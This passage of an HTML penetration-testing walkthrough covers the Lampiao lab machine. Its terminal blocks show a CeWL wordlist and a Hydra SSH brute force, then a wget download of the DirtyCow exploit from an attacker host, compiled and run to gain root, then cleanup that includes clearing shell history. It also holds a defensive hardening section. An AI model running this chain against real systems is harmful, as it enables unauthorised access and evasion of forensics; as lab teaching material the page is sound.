+  <div class="glass">
+    <h3>Building the Target List</h3>
+    <p class="text-sm" style="color:#aaa;margin-bottom:1rem;">With usernames extracted from the CMS, we create a targeted username list for credential attacks.</p>
+    <div class="terminal-block">
+      <span class="prompt">kali@attacker:~$</span> <span class="cmd">echo "tiago" &gt; usernames.txt</span><br>
+      <span class="prompt">kali@attacker:~$</span> <span class="cmd">echo "Eder" &gt;&gt; usernames.txt</span><br>
+      <span class="prompt">kali@attacker:~$</span> <span class="cmd">cat usernames.txt</span><br>
+      <span class="output">tiago</span><br>
+      <span class="output">Eder</span>
+    </div>
+    <div class="mindset">
+      <div class="label">Attacker Thinking</div>
+      <p>"Every username I discover reduces the search space for credential attacks. If CMS usernames match system usernames, I can directly target SSH authentication."</p>
+    </div>
+  </div>
+</section>
+
+<!-- ====== CEWL ====== -->
+<section class="section section-alt" id="cewl">
+  <h2>Phase 6: Password Generation with CEWL</h2>
+  <div class="glass">
+    <h3>Targeted Wordlist Generation</h3>
+    <p class="text-sm" style="color:#aaa;margin-bottom:1rem;">Generic wordlists (like rockyou.txt) contain millions of entries. CEWL creates a <strong>focused, context-aware</strong> password list by crawling the target website.</p>
+    <div class="terminal-block">
+      <span class="comment"># Crawl the Drupal site and generate a custom wordlist</span><br>
+      <span class="prompt">kali@attacker:~$</span> <span class="cmd">cewl http://192.168.56.103:1898/?q=node/1 -w pass.txt</span><br>
+      <span class="output">CeWL 6.1 (Max Length) Open Source Tool</span><br>
+      <span class="output">Crawling: http://192.168.56.103:1898/?q=node/1</span><br>
+      <span class="output">Words extracted: 127</span><br>
+      <span class="output">Wordlist saved to: pass.txt</span>
+    </div>
+    <div class="cewl-flow">
+      <div class="cf-step">Website Content</div>
+      <div class="cf-arrow">&#8594;</div>
+      <div class="cf-step">Word Extraction</div>
+      <div class="cf-arrow">&#8594;</div>
+      <div class="cf-step">Custom Password List</div>
+      <div class="cf-arrow">&#8594;</div>
+      <div class="cf-step">Credential Attack</div>
+    </div>
+    <div class="split">
+      <div>
+        <h3>Why CEWL Works</h3>
+        <ul style="list-style:none;font-size:0.82rem;color:#aaa;">
+          <li style="padding:0.3rem 0;">&#8226; Extracts real words from site content</li>
+          <li style="padding:0.3rem 0;">&#8226; Users choose passwords related to their content</li>
+          <li style="padding:0.3rem 0;">&#8226; Contextual words beat generic dictionaries</li>
+          <li style="padding:0.3rem 0;">&#8226; Small list = faster brute-force attacks</li>
+        </ul>
+      </div>
+      <div>
+        <h3>vs Generic Wordlists</h3>
+        <div class="info-card">
+          <div class="card-title">rockyou.txt</div>
+          <div class="card-text">14 million passwords — hours to test. Contains mostly irrelevant entries.</div>
+        </div>
+        <div class="info-card mt-1">
+          <div class="card-title">CEWL (127 words)</div>
+          <div class="card-text">127 targeted words — tested in seconds. Contains site-relevant vocabulary the user likely chose from.</div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ====== HYDRA ====== -->
+<section class="section" id="hydra">
+  <h2>Phase 7: Hydra Brute Force Attack</h2>
+  <div class="glass">
+    <h3>SSH Credential Attack</h3>
+    <p class="text-sm" style="color:#aaa;margin-bottom:1rem;">With a username list and targeted password list, we launch Hydra against the SSH service.</p>
+    <div class="terminal-block">
+      <span class="comment"># Launch targeted brute-force attack on SSH</span><br>
+      <span class="prompt">kali@attacker:~$</span> <span class="cmd">hydra -L usernames.txt -P pass.txt -o hydra.txt -e nsr -f -t 4 ssh://192.168.56.103</span><br>
+      <span class="output">Hydra v9.5 (c) 2023 by van Hauser/THC</span><br>
+      <span class="output">[DATA] max 4 tasks per target, 2 targets</span><br>
+      <span class="output">[DATA] attacking ssh://192.168.56.103:22/</span><br>
+      <span class="output">[22][ssh] host: 192.168.56.103</span><br>
+      <span class="output highlight">  login: tiago   password: Virgulino</span><br>
+      <span class="output sim-success">[STATUS] attack finished (valid credentials found)</span>
+    </div>
+    <div class="table-wrap">
+      <table>
+        <tr><th>Option</th><th>Meaning</th><th>Why Important</th></tr>
+        <tr><td>-L</td><td>Username list file</td><td>Tests multiple usernames, not just one</td></tr>
+        <tr><td>-P</td><td>Password list file</td><td>Uses targeted, context-aware passwords</td></tr>
+        <tr><td>-o</td><td>Output file</td><td>Saves results for later reference</td></tr>
+        <tr><td>-e nsr</td><td>Try null, same, reverse</td><td>Accounts for common password patterns</td></tr>
+        <tr><td>-f</td><td>Stop on first success</td><td>Saves time once valid credentials found</td></tr>
+        <tr><td>-t 4</td><td>Thread count</td><td>Controls attack speed vs detection risk</td></tr>
+      </table>
+    </div>
+    <div class="mindset">
+      <div class="label">Attacker Thinking</div>
+      <p>"Weak credentials are the easiest entry point. With just 2 usernames and 127 targeted passwords, I can test every combination in under a minute. The -e nsr flag also checks if the password is null, same as username, or reversed — common user mistakes."</p>
+    </div>
+  </div>
+</section>
+
+<!-- ====== SSH ACCESS ====== -->
+<section class="section section-alt" id="ssh-access">
+  <h2>Phase 8: SSH Access</h2>
+  <div class="glass">
+    <h3>Initial Foothold</h3>
+    <p class="text-sm" style="color:#aaa;margin-bottom:1rem;">Using the discovered credentials, we authenticate to the target via SSH and obtain a remote shell.</p>
+    <div class="terminal-block">
+      <span class="prompt">kali@attacker:~$</span> <span class="cmd">ssh tiago@192.168.56.103</span><br>
+      <span class="output">The authenticity of host '192.168.56.103 (192.168.56.103)' can't be established.</span><br>
+      <span class="output">Are you sure you want to continue connecting? yes</span><br>
+      <span class="output">tiago@192.168.56.103's password: [Virgulino]</span><br>
+      <span class="output">Welcome to Ubuntu 14.04 LTS</span><br>
+      <br>
+      <span class="prompt">tiago@Lampiao:~$</span> <span class="cmd">whoami</span><br>
+      <span class="output highlight">tiago</span>
+    </div>
+    <div class="success-badge">[+] SSH Session Established</div>
+    <div class="mindset">
+      <div class="label">Important Distinction</div>
+      <p>"We have user-level access as 'tiago' — NOT root access yet. The foothold is established, but privilege escalation is still required for full system control."</p>
+    </div>
+  </div>
+</section>
+
+<!-- ====== LOCAL ENUMERATION ====== -->
+<section class="section" id="local-enum">
+  <h2>Phase 9: Local Enumeration</h2>
+  <div class="glass">
+    <h3>Understanding the Target System</h3>
+    <p class="text-sm" style="color:#aaa;margin-bottom:1rem;">After gaining a foothold, we enumerate the compromised system to identify privilege escalation vectors.</p>
+    <div class="terminal-block">
+      <span class="prompt">tiago@Lampiao:~$</span> <span class="cmd">whoami</span><br>
+      <span class="output">tiago</span><br>
+      <span class="prompt">tiago@Lampiao:~$</span> <span class="cmd">uname -a</span><br>
+      <span class="output">Linux Lampiao 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:12 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux</span><br>
+      <span class="prompt">tiago@Lampiao:~$</span> <span class="cmd">id</span><br>
+      <span class="output">uid=1000(tiago) gid=1000(tiago) groups=1000(tiago)</span><br>
+      <span class="prompt">tiago@Lampiao:~$</span> <span class="cmd">cat /etc/*release | grep DISTRIB_DESCRIPTION</span><br>
+      <span class="output">DISTRIB_DESCRIPTION="Ubuntu 14.04 LTS"</span>
+    </div>
+    <div class="split">
+      <div>
+        <h3>Key Information Gathered</h3>
+        <div class="table-wrap">
+          <table>
+            <tr><th>Property</th><th>Value</th><th>Significance</th></tr>
+            <tr><td>Kernel</td><td>3.13.0-32-generic</td><td>Old kernel — likely vulnerable</td></tr>
+            <tr><td>Arch</td><td>x86_64</td><td>64-bit exploit required</td></tr>
+            <tr><td>OS</td><td>Ubuntu 14.04</td><td>End-of-life, no security patches</td></tr>
+            <tr><td>User</td><td>tiago (uid=1000)</td><td>Standard user, not in sudo group</td></tr>
+          </table>
+        </div>
+      </div>
+      <div>
+        <h3>Why This Matters</h3>
+        <p class="text-sm" style="color:#aaa;">The kernel version <strong>3.13.0-32-generic</strong> dates from mid-2014. This is an ancient kernel with multiple known privilege escalation vulnerabilities. The old OS means no kernel security patches have been applied.</p>
+        <div class="mindset mt-1">
+          <div class="label">Attacker Thinking</div>
+          <p>"An old kernel with no security updates is almost certainly vulnerable to multiple privilege escalation exploits. I should use an exploit suggester to identify the best candidates."</p>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ====== PRIVILEGE ESCALATION METHODOLOGY ====== -->
+<section class="section section-alt" id="privesc-method">
+  <h2>Phase 10: Privilege Escalation Methodology</h2>
+  <div class="glass">
+    <h3>From User to Root</h3>
+    <p class="text-sm" style="color:#aaa;margin-bottom:1rem;">Privilege escalation is the process of moving from a low-privilege account to a higher-privilege one — typically root or administrator.</p>
+    <div class="arch">
+      <div class="layer">User (tiago)</div>
+      <div class="conn">&#8595;</div>
+      <div class="layer highlight">Privilege Escalation</div>
+      <div class="conn">&#8595;</div>
+      <div class="layer">Root (full control)</div>
+    </div>
+    <div class="split">
+      <div>
+        <h3>Common Vectors</h3>
+        <ul style="list-style:none;font-size:0.82rem;color:#aaa;">
+          <li style="padding:0.3rem 0;">&#8226; Kernel vulnerabilities (DirtyCow)</li>
+          <li style="padding:0.3rem 0;">&#8226; Misconfigured sudo permissions</li>
+          <li style="padding:0.3rem 0;">&#8226; SUID binary exploitation</li>
+          <li style="padding:0.3rem 0;">&#8226; Cron job abuse</li>
+          <li style="padding:0.3rem 0;">&#8226; Service exploitation</li>
+        </ul>
+      </div>
+      <div>
+        <h3>Why Enumerate First</h3>
+        <p class="text-sm" style="color:#aaa;">Blindly running exploits without understanding the system is dangerous and ineffective. Enumeration reveals:</p>
+        <ul style="list-style:none;font-size:0.82rem;color:#aaa;margin-top:0.5rem;">
+          <li style="padding:0.2rem 0;">&#8226; Exact kernel version</li>
+          <li style="padding:0.2rem 0;">&#8226; Architecture (32 vs 64-bit)</li>
+          <li style="padding:0.2rem 0;">&#8226; Available compilers</li>
+          <li style="padding:0.2rem 0;">&#8226; Installed security patches</li>
+          <li style="padding:0.2rem 0;">&#8226; Filesystem layout</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ====== LINUX EXPLOIT SUGGESTER ====== -->
+<section class="section" id="exploit-suggester">
+  <h2>Phase 11: Linux Exploit Suggester</h2>
+  <div class="glass">
+    <h3>Automated Vulnerability Matching</h3>
+    <p class="text-sm" style="color:#aaa;margin-bottom:1rem;">Linux Exploit Suggester (LES) automatically cross-references kernel version and OS details against known vulnerabilities.</p>
+    <div class="terminal-block">
+      <span class="comment"># On Kali: Start HTTP server to transfer script</span><br>
+      <span class="prompt">kali@attacker:~$</span> <span class="cmd">python3 -m http.server 8080</span><br>
+      <span class="output">Serving HTTP on 0.0.0.0 port 8080 ...</span><br>
+      <br>
+      <span class="comment"># On Target: Download and run LES</span><br>
+      <span class="prompt">tiago@Lampiao:/tmp$</span> <span class="cmd">wget http://&lt;KALI_IP&gt;:8080/linux-exploit-suggester.sh</span><br>
+      <span class="output">2024-01-15 14:30:22 (2.4 MB/s) - 'linux-exploit-suggester.sh' saved</span><br>
+      <span class="prompt">tiago@Lampiao:/tmp$</span> <span class="cmd">chmod +x linux-exploit-suggester.sh</span><br>
+      <span class="prompt">tiago@Lampiao:/tmp$</span> <span class="cmd">./linux-exploit-suggester.sh</span><br>
+      <span class="output">[+] Kernel: 3.13.0-32-generic</span><br>
+      <span class="output">[+] CVE-2016-5195 - DirtyCow</span><br>
+      <span class="output highlight">[+] Recommended: DirtyCow (CVE-2016-5195)</span>
+    </div>
+    <div class="mindset">
+      <div class="label">Attacker Thinking</div>
+      <p>"LES automates the exploit research process. Instead of manually searching for vulnerabilities, I get a targeted list of exploits that match this specific kernel version. DirtyCow is highly reliable for this kernel."</p>
+    </div>
+  </div>
+</section>
+
+<!-- ====== DIRTYCOW DEEP DIVE ====== -->
+<section class="section section-alt" id="dirtycow-deep">
+  <h2>Phase 12: DirtyCow Vulnerability Deep Dive</h2>
+  <div class="glass">
+    <h3>CVE-2016-5195 — Understanding the Exploit</h3>
+    <p class="text-sm" style="color:#aaa;margin-bottom:1rem;">DirtyCow is a <strong>race condition</strong> in the Linux kernel's copy-on-write (COW) mechanism that allows an unprivileged user to write to read-only memory mappings.</p>
+    <div class="dc-flow" id="dcFlow">
+      <div class="dc-node active">Read-Only File (e.g., /etc/passwd)</div>
+      <div class="dc-arrow">&#9660;</div>
+      <div class="dc-node">Race Condition in COW Handler</div>
+      <div class="dc-arrow">&#9660;</div>
+      <div class="dc-node">Unauthorized Write Access Gained</div>
+      <div class="dc-arrow">&#9660;</div>
+      <div class="dc-node">Privilege Escalation</div>
+    </div>
+    <div class="split">
+      <div>
+        <h3>Technical Breakdown</h3>
+        <ul style="list-style:none;font-size:0.82rem;color:#aaa;">
+          <li style="padding:0.3rem 0;">&#8226; <strong>COW:</strong> Kernel optimization that shares memory pages until a write occurs</li>
+          <li style="padding:0.3rem 0;">&#8226; <strong>Race:</strong> Concurrent access creates a window where permissions are bypassed</li>
+          <li style="padding:0.3rem 0;">&#8226; <strong>Write:</strong> Unauthorized modification of protected system files</li>
+          <li style="padding:0.3rem 0;">&#8226; <strong>Escalation:</strong> Attacker adds new root user or modifies existing credentials</li>
+        </ul>
+      </div>
+      <div>
+        <h3>Real-World Impact</h3>
+        <div class="info-card">
+          <div class="card-title">CVE-2016-5195</div>
+          <div class="card-text">Discovered in 2016, DirtyCow affected Linux kernels from 2.6.22 (2007) to 4.8.3 (2016). It was exploited in real-world attacks before being patched. The vulnerability existed for <strong>9 years</strong> before discovery.</div>
+        </div>
+        <div class="info-card mt-1">
+          <div class="card-title">Impact Score</div>
+          <div class="card-text">CVSS 7.8 (High) — requires local access but no authentication. Complete system compromise is possible with a single binary.</div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ====== DIRTYCOW EXPLOITATION ====== -->
+<section class="section" id="dirtycow-exploit">
+  <h2>Phase 13: DirtyCow Exploitation</h2>
+  <div class="glass">
+    <h3>From User to Root</h3>
+    <p class="text-sm" style="color:#aaa;margin-bottom:1rem;">We download, compile, and execute the DirtyCow exploit to escalate privileges to root.</p>
+    <div class="terminal-block">
+      <span class="comment"># On Kali: Download exploit</span><br>
+      <span class="prompt">kali@attacker:~$</span> <span class="cmd">wget https://www.exploit-db.com/download/40847.cpp -O dirtycow.cpp</span><br>
+      <span class="prompt">kali@attacker:~$</span> <span class="cmd">python3 -m http.server 80</span><br>
+      <span class="output">Serving HTTP on 0.0.0.0 port 80 ...</span><br>
+      <br>
+      <span class="comment"># On Target: Transfer exploit</span><br>
+      <span class="prompt">tiago@Lampiao:/tmp$</span> <span class="cmd">wget http://&lt;KALI_IP&gt;/dirtycow.cpp</span><br>
+      <span class="output">2024-01-15 14:35:10 (3.1 MB/s) - 'dirtycow.cpp' saved</span><br>
+      <br>
+      <span class="comment"># Compile exploit</span><br>
+      <span class="prompt">tiago@Lampiao:/tmp$</span> <span class="cmd">g++ -o dirtycow dirtycow.cpp -Wall -O2 -std=c++11 -pthread -lutil</span><br>
+      <span class="output">(no errors — compilation successful)</span><br>
+      <br>
+      <span class="comment"># Run exploit</span><br>
+      <span class="prompt">tiago@Lampiao:/tmp$</span> <span class="cmd">chmod +x dirtycow && ./dirtycow</span><br>
+      <span class="output">DirtyCow root privilege escalation</span><br>
+      <span class="output">Backing up /etc/passwd to /tmp/passwd.bak</span><br>
+      <span class="output highlight">Creating root user: firefart</span><br>
+      <span class="output highlight">Password: &lt;generated_password&gt;</span>
+    </div>
+    <div class="mindset">
+      <div class="label">Important</div>
+      <p>"Read the exploit output carefully — it tells you the newly created root username and password. These are randomly generated by the exploit and printed to stdout."</p>
+    </div>
+  </div>
+</section>
+
+<!-- ====== ROOT ACCESS ====== -->
+<section class="section section-alt" id="root-access">
+  <h2>Phase 14: Root Access</h2>
+  <div class="glass">
+    <h3>Full System Control</h3>
+    <p class="text-sm" style="color:#aaa;margin-bottom:1rem;">Using the credentials generated by DirtyCow, we switch to the root user and verify full access.</p>
+    <div class="terminal-block">
+      <span class="prompt">tiago@Lampiao:/tmp$</span> <span class="cmd">su firefart</span><br>
+      <span class="output">Password: [exploit_generated_password]</span><br>
+      <span class="prompt highlight">root@Lampiao:/tmp#</span> <span class="cmd">whoami</span><br>
+      <span class="output highlight">root</span><br>
+      <span class="prompt highlight">root@Lampiao:/tmp#</span> <span class="cmd">id</span><br>
+      <span class="output">uid=0(root) gid=0(root) groups=0(root)</span><br>
+      <span class="prompt highlight">root@Lampiao:/tmp#</span> <span class="cmd">cd /root && ls</span><br>
+      <span class="output">flag.txt</span><br>
+      <span class="prompt highlight">root@Lampiao:/tmp#</span> <span class="cmd">cat flag.txt</span><br>
+      <span class="output sim-success">[FLAG_CONTENT]</span>
+    </div>
+    <div class="success-badge" style="background:rgba(245,66,26,0.15);border-color:#f5421a;color:#f5421a;">[+] ROOT ACCESS ACHIEVED — FULL SYSTEM COMPROMISE</div>
+    <div class="mindset">
+      <div class="label">Milestone</div>
+      <p>"Privilege escalation is complete. We now have unrestricted access to the entire system — all files, processes, network traffic, and configurations."</p>
+    </div>
+  </div>
+</section>
+
+<!-- ====== CLEANUP ====== -->
+<section class="section" id="cleanup">
+  <h2>Phase 15: Cleanup & OPSEC</h2>
+  <div class="glass">
+    <h3>Operational Security</h3>
+    <p class="text-sm" style="color:#aaa;margin-bottom:1rem;">Professional penetration testers remove artifacts and tools to maintain operational security and leave the target system in its original state.</p>
+    <div class="terminal-block">
+      <span class="comment"># Remove exploit artifacts</span><br>
+      <span class="prompt highlight">root@Lampiao:/tmp#</span> <span class="cmd">rm /tmp/dirtycow.cpp</span><br>
+      <span class="prompt highlight">root@Lampiao:/tmp#</span> <span class="cmd">rm /tmp/dirtycow</span><br>
+      <span class="prompt highlight">root@Lampiao:/tmp#</span> <span class="cmd">rm /tmp/linux-exploit-suggester.sh</span><br>
+      <span class="prompt highlight">root@Lampiao:/tmp#</span> <span class="cmd">rm /tmp/passwd.bak</span><br>
+      <span class="output">Artifacts removed.</span>
+    </div>
+    <div class="split">
+      <div>
+        <h3>Why Cleanup Matters</h3>
+        <ul style="list-style:none;font-size:0.82rem;color:#aaa;">
+          <li style="padding:0.3rem 0;">&#8226; <strong>Detection:</strong> Leftover files trigger security alerts</li>
+          <li style="padding:0.3rem 0;">&#8226; <strong>Forensics:</strong> Tools help blue teams trace attack paths</li>
+          <li style="padding:0.3rem 0;">&#8226; <strong>Professionalism:</strong> Clean testing demonstrates discipline</li>
+          <li style="padding:0.3rem 0;">&#8226; <strong>Stealth:</strong> Reduces chance of being discovered during assessment</li>
+        </ul>
+      </div>
+      <div>
+        <h3>Best Practices</h3>
+        <ul style="list-style:none;font-size:0.82rem;color:#aaa;">
+          <li style="padding:0.3rem 0;">&#8226; Clean /tmp and /dev/shm after use</li>
+          <li style="padding:0.3rem 0;">&#8226; Remove uploaded tools and scripts</li>
+          <li style="padding:0.3rem 0;">&#8226; Clear shell history if needed</li>
+          <li style="padding:0.3rem 0;">&#8226; Restore modified system files</li>
+          <li style="padding:0.3rem 0;">&#8226; Log out of all sessions cleanly</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ====== ATTACK CHAIN ====== -->
+<section class="section section-alt" id="attack-chain">
+  <h2>Attack Chain Visualization</h2>
+  <p class="text-sm mb-2" style="color:#999;">The complete kill chain from initial reconnaissance to full system compromise.</p>
+  <div class="chain">
+    <div class="link">Reconnaissance</div>
+    <div class="arrow">&#9660;</div>
+    <div class="link">Port Scanning</div>
+    <div class="arrow">&#9660;</div>
+    <div class="link">Drupal Discovery</div>
+    <div class="arrow">&#9660;</div>
+    <div class="link">Username Enumeration</div>
+    <div class="arrow">&#9660;</div>
+    <div class="link">Password Generation</div>
+    <div class="arrow">&#9660;</div>
+    <div class="link">Hydra Attack</div>
+    <div class="arrow">&#9660;</div>
+    <div class="link">SSH Access</div>
+    <div class="arrow">&#9660;</div>
+    <div class="link">Kernel Enumeration</div>
+    <div class="arrow">&#9660;</div>
+    <div class="link">DirtyCow Exploitation</div>
+    <div class="arrow">&#9660;</div>
+    <div class="link" style="border-color:#f5421a;color:#f5421a;font-weight:600;">Root Access</div>
+  </div>
+</section>
+
+<!-- ====== DEFENSIVE ====== -->
+<section class="section" id="defensive">
+  <h2>Defensive Security Perspective</h2>
+  <p class="text-sm mb-2" style="color:#999;">Understanding how each attack phase could have been prevented.</p>
+  <div class="def-card">
+    <div class="def-title">Strong Password Policies</div>
+    <p>The entire attack chain relied on weak credentials. Enforcing minimum complexity, length requirements, and password expiration would have prevented the Hydra attack. Password "Virgulino" would fail any modern password policy.</p>
+  </div>
+  <div class="def-card">
+    <div class="def-title">Multi-Factor Authentication (MFA)</div>
+    <p>Even if credentials were compromised, SSH MFA (TOTP, U2F, or certificate-based auth) would block unauthorized access. This is the single most effective defense against credential attacks.</p>
+  </div>
+  <div class="def-card">
+    <div class="def-title">Patch Management</div>
+    <p>The kernel vulnerability (CVE-2016-5195) was patched in 2016. Running Ubuntu 14.04 without security updates for years guaranteed exploitation. Regular patching eliminates entire classes of privilege escalation attacks.</p>
+  </div>
+  <div class="def-card">
+    <div class="def-title">SSH Hardening</div>
+    <p>Disabling password-based authentication, using key-only access, changing the default port, and implementing fail2ban would stop brute-force attacks entirely. Rate-limiting also mitigates Hydra-style attacks.</p>
+  </div>
+  <div class="def-card">
+    <div class="def-title">CMS Security Hardening</div>
+    <p>Disabling user enumeration, removing author page visibility to anonymous users, and implementing WAF rules would prevent username harvesting. Limiting login attempts also prevents brute-force discovery.</p>
+  </div>
+  <div class="def-card">
+    <div class="def-title">Least Privilege & Kernel Hardening</div>
+    <p>Even with user access, proper SELinux/AppArmor policies, kernel hardening (KASLR, SMEP, SMAP), and regular updates would block DirtyCow and similar kernel exploits.</p>
+  </div>
+  <div class="def-card">
+    <div class="def-title">Account Lockout Policies</div>
+    <p>Implementing account lockout after 3-5 failed SSH login attempts would make brute-force attacks impractical. Combined with logging and alerting, this creates both preventive and detective controls.</p>
+  </div>
+</section>
+
+<!-- ====== SIMULATIONS ====== -->
+<section class="section section-alt" id="simulations">
+  <h2>Interactive Simulations</h2>
+  <p class="text-sm mb-2" style="color:#999;">Click each button to simulate the corresponding attack phase. Educational demonstrations only.</p>
+  <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:1.2rem;">
+    <div class="glass">
+      <h3>Nmap Discovery</h3>
+      <p class="text-sm mb-1" style="color:#888;">Simulate network discovery scan</p>
+      <div class="sim-container" id="simNmap">
+        <div class="sim-output" id="simNmapOut">[Click to start simulation]</div>
+      </div>
+      <button class="sim-btn" onclick="runSimNmap()">Run Scan</button>
+    </div>
+    <div class="glass">
+      <h3>Hydra Attack</h3>
+      <p class="text-sm mb-1" style="color:#888;">Simulate SSH brute-force</p>
+      <div class="sim-container" id="simHydra">
+        <div class="sim-output" id="simHydraOut">[Click to start simulation]</div>
+      </div>
+      <button class="sim-btn" onclick="runSimHydra()">Attack</button>
+    </div>
+    <div class="glass">
+      <h3>CEWL Generator</h3>
+      <p class="text-sm mb-1" style="color:#888;">Simulate wordlist generation</p>
+      <div class="sim-container" id="simCewl">
+        <div class="sim-output" id="simCewlOut">[Click to start simulation]</div>
+      </div>
+      <button class="sim-btn" onclick="runSimCewl()">Generate</button>
+    </div>
+    <div class="glass">
+      <h3>SSH Login</h3>
+      <p class="text-sm mb-1" style="color:#888;">Simulate SSH authentication</p>
+      <div class="sim-container" id="simSsh">
+        <div class="sim-output" id="simSshOut">[Click to start simulation]</div>
+      </div>
+      <button class="sim-btn" onclick="runSimSsh()">Connect</button>
+    </div>
+    <div class="glass">
+      <h3>DirtyCow Exploit</h3>
+      <p class="text-sm mb-1" style="color:#888;">Simulate kernel exploitation flow</p>
+      <div class="sim-container" id="simDc">
+        <div class="sim-output" id="simDcOut">[Click to start simulation]</div>
+      </div>
+      <button class="sim-btn" onclick="runSimDc()">Exploit</button>
+    </div>
+    <div class="glass">
+      <h3>Linux Enumeration</h3>
+      <p class="text-sm mb-1" style="color:#888;">Simulate system enumeration</p>
+      <div class="sim-container" id="simEnum">
+        <div class="sim-output" id="simEnumOut">[Click to start simulation]</div>
+      </div>
+      <button class="sim-btn" onclick="runSimEnum()">Enumerate</button>
+    </div>
+  </div>
+</section>
+
+<!-- ====== LESSONS ====== -->
+<section class="section" id="lessons">
+  <h2>Final Lessons Learned</h2>
+  <div class="quote-section">
+    <blockquote>We didn't hack randomly — we followed a chain of weaknesses.</blockquote>
+    <div class="cite">Lampiao Machine — Full Attack Chain</div>
+  </div>
+  <div class="lessons-grid">
+    <div class="lesson-card">
+      <div class="num">01</div>
+      <h4>Reconnaissance</h4>
+      <p>Systematic network discovery and port scanning identifies the target and maps the attack surface before any exploitation begins.</p>
+    </div>
+    <div class="lesson-card">
+      <div class="num">02</div>
+      <h4>Username Discovery</h4>
+      <p>CMS platforms leak user information through author pages. Web usernames often match system usernames — a critical information disclosure.</p>
+    </div>
+    <div class="lesson-card">
+      <div class="num">03</div>
+      <h4>Credential Attacks</h4>
+      <p>Targeted wordlists (CEWL) combined with automated brute-force tools (Hydra) can crack weak credentials in minutes when SSH is exposed.</p>
+    </div>
+    <div class="lesson-card">
+      <div class="num">04</div>
+      <h4>SSH Compromise</h4>
+      <p>Weak credentials provide the easiest entry point. Once SSH access is obtained, the attacker has a foothold on the system for further exploitation.</p>
+    </div>
+    <div class="lesson-card">
+      <div class="num">05</div>
+      <h4>Privilege Escalation</h4>
+      <p>Kernel enumeration reveals outdated software. Linux Exploit Suggester automates vulnerability matching, identifying DirtyCow as the escalation path.</p>
+    </div>
+    <div class="lesson-card">
+      <div class="num">06</div>
+      <h4>Kernel Exploitation</h4>
+      <p>DirtyCow exploits a race condition in copy-on-write to modify protected system files. Old kernels that are not patched are trivially exploitable.</p>
+    </div>
+  </div>
+</section>
+
+<footer>
+  Lampiao Machine — Premium Penetration Testing Walkthrough<br>
+  Educational Purposes Only &mdash; Offensive Security Academy
+</footer>
+
+<script>
+// ---- NAV PROGRESS ----
+const sections = document.querySelectorAll('.section, .section-alt');
+const progressBar = document.getElementById('progressBar');
+const sectionLabel = document.getElementById('sectionLabel');
+
+function updateProgress() {
+  let max = 0, current = 0;
+  sections.forEach(s => {
+    const rect = s.getBoundingClientRect();
+    if (rect.top < window.innerHeight / 2) {
+      current = Math.max(current, s.getBoundingClientRect().top);
+    }
+  });
+  const scrollTop = window.scrollY;
+  const docHeight = document.documentElement.scrollHeight - window.innerHeight;
+  const pct = docHeight > 0 ? Math.min(100, (scrollTop / docHeight) * 100) : 0;
+  progressBar.style.width = pct + '%';
+
+  let label = 'Start';
+  const thresholds = [0.05, 0.1, 0.2, 0.3, 0.4, 0.5, 0.6, 0.7, 0.75, 0.8, 0.85, 0.9, 0.95];
+  const labels = ['Overview','Discovery','Port Scan','Web Enum','Drupal','Usernames','CEWL','Hydra','SSH','Local Enum','Privesc','LES','DirtyCow','Exploit','Root','Cleanup','Chain','Defense','Sims','Lessons'];
+  const idx = Math.min(labels.length - 1, Math.floor((pct / 100) * labels.length));
+  sectionLabel.textContent = labels[idx] || 'Start';
+}
+window.addEventListener('scroll', updateProgress);
+updateProgress();
+
+// ---- HERO STATUS LOGS ----
+const logs = [
+  'Target Discovered',
+  'Ports Enumerated',
+  'Drupal CMS Detected',
+  'Usernames Identified',
+  'CEWL Wordlist Generated',
+  'Hydra Attack Successful',
+  'SSH Access Obtained',
+  'Kernel Enumerated',
+  'DirtyCow Exploit Executed',
+  'Root Access Achieved'
+];
+const statusLogs = document.getElementById('statusLogs');
+logs.forEach((text, i) => {
+  const el = document.createElement('div');
+  el.className = 'log';
+  el.textContent = '[+] ' + text;
+  statusLogs.appendChild(el);
+});
+function animateLogs() {
+  const els = statusLogs.querySelectorAll('.log');
+  let idx = 0;
+  function showNext() {
+    if (idx >= els.length) { setTimeout(() => { idx = 0; els.forEach(e => e.className = 'log'); showNext(); }, 4000); return; }
+    const el = els[idx];
+    els.forEach(e => { e.classList.remove('current'); if (e !== el) e.classList.add('dim'); });
+    el.className = 'log visible current';
+    idx++;
+    setTimeout(showNext, 1200);
+  }
+  showNext();
+}
+animateLogs();
+
+// ---- HERO CANVAS ----
+const canvas = document.getElementById('heroCanvas');
+const ctx = canvas.getContext('2d');
+let w, h, particles = [];
+function resizeCanvas() {
+  const hero = document.getElementById('hero');
+  w = hero.offsetWidth; h = hero.offsetHeight;
+  canvas.width = w; canvas.height = h;
+}
+resizeCanvas();
+window.addEventListener('resize', resizeCanvas);
+
+class Particle {
+  constructor() { this.reset(); }
+  reset() {
+    this.x = Math.random() * w;
+    this.y = Math.random() * h;
+    this.vx = (Math.random() - 0.5) * 0.6;
+    this.vy = (Math.random() - 0.5) * 0.6;
+    this.r = Math.random() * 2 + 0.5;
+    this.a = Math.random() * 0.4 + 0.1;
+  }
+  update() {
+    this.x += this.vx; this.y += this.vy;
+    if (this.x < 0 || this.x > w) this.vx *= -1;
+    if (this.y < 0 || this.y > h) this.vy *= -1;
+  }
+  draw() {
+    ctx.beginPath();
+    ctx.arc(this.x, this.y, this.r, 0, Math.PI * 2);
+    ctx.fillStyle = `rgba(245,66,26,${this.a})`;
+    ctx.fill();
+  }
+}
+for (let i = 0; i < 80; i++) particles.push(new Particle());
+
+function drawConnections() {
+  for (let i = 0; i < particles.length; i++) {
+    for (let j = i + 1; j < particles.length; j++) {
+      const dx = particles[i].x - particles[j].x;
+      const dy = particles[i].y - particles[j].y;
+      const dist = Math.sqrt(dx * dx + dy * dy);
+      if (dist < 140) {
+        ctx.beginPath();
+        ctx.moveTo(particles[i].x, particles[i].y);
+        ctx.lineTo(particles[j].x, particles[j].y);
+        ctx.strokeStyle = `rgba(212,56,10,${0.08 * (1 - dist / 140)})`;
+        ctx.lineWidth = 0.5;
+        ctx.stroke();
+      }
+    }
+  }
+}
+function animateCanvas() {
